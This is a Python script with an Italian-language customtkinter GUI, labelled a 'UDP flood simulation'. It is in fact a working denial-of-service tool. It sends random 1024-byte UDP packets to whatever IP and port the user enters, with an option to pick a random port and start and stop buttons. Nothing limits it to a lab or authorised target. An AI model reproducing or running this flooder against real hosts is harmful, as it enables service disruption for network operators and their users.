import socket as so
import random
import time
import customtkinter as ctk

attack_running = False

def generate_packet():
    return random._urandom(1024)  

def udp_flood(target_ip, target_port, num_packets):
    global attack_running  
    try:
        sock = so.socket(so.AF_INET, so.SOCK_DGRAM)
        
        sent_packets = 0
        
        status_label.configure(text=f"Inizio attacco UDP flood su {target_ip}:{target_port}", text_color="green")
        
        for _ in range(num_packets):
            if not attack_running: 
                status_label.configure(text="Attacco interrotto.", text_color="red")
                return
            
            packet = generate_packet()
            sock.sendto(packet, (target_ip, target_port))
            sent_packets += 1
            if sent_packets % 100 == 0:
                status_label.configure(text=f"{sent_packets} pacchetti inviati.", text_color="orange")
                window.update()  
            
            time.sleep(0.01)
        
  
        status_label.configure(text=f"\nAttacco completato. {sent_packets} pacchetti inviati al target.", text_color="blue")
    
    except Exception as e:
        status_label.configure(text=f"Errore: {e}", text_color="red")
    finally:
        sock.close()

def generate_random_port():
    return random.randint(1024, 49151)

def start_attack():
    global attack_running
    attack_running = True  
    target_ip = ip_entry.get()
    
    target_port = int(port_entry.get()) if not random_port_checkbox.get() else generate_random_port()
   
    num_packets = int(packets_entry.get())
    
    udp_flood(target_ip, target_port, num_packets)


def stop_attack():
    global attack_running
    attack_running = False  

# Creazione della finestra principale
window = ctk.CTk()
window.title("Simulazione UDP Flood")
window.geometry("500x400")

# Titolo
title_label = ctk.CTkLabel(window, text="Simulazione UDP Flood", font=("Arial", 18))
title_label.pack(pady=20)

# IP del target
ip_label = ctk.CTkLabel(window, text="IP della macchina target:")
ip_label.pack()
ip_entry = ctk.CTkEntry(window, placeholder_text="Inserisci IP del target")
ip_entry.pack(pady=5)

# Porta del target
port_label = ctk.CTkLabel(window, text="Porta UDP della macchina target:")
port_label.pack()
port_entry = ctk.CTkEntry(window, placeholder_text="Inserisci la porta (o lascia vuoto per random)")
port_entry.pack(pady=5)

# Checkbox per selezionare una porta casuale
random_port_checkbox = ctk.CTkCheckBox(window, text="Seleziona porta casuale", variable=ctk.BooleanVar(value=False))
random_port_checkbox.pack()

# Numero di pacchetti
packets_label = ctk.CTkLabel(window, text="Numero di pacchetti da inviare:")
packets_label.pack()
packets_entry = ctk.CTkEntry(window, placeholder_text="Inserisci il numero di pacchetti")
packets_entry.pack(pady=5)

# Pulsante per avviare l'attacco
start_button = ctk.CTkButton(window, text="Avvia Attacco", command=start_attack)
start_button.pack(pady=10)

# Pulsante per fermare l'attacco
stop_button = ctk.CTkButton(window, text="Ferma Attacco", command=stop_attack)
stop_button.pack(pady=10)

# Etichetta per il feedback dello stato
status_label = ctk.CTkLabel(window, text="Pronto per avviare l'attacco.", text_color="black")
status_label.pack(pady=10)

# Avvia la finestra
window.mainloop()
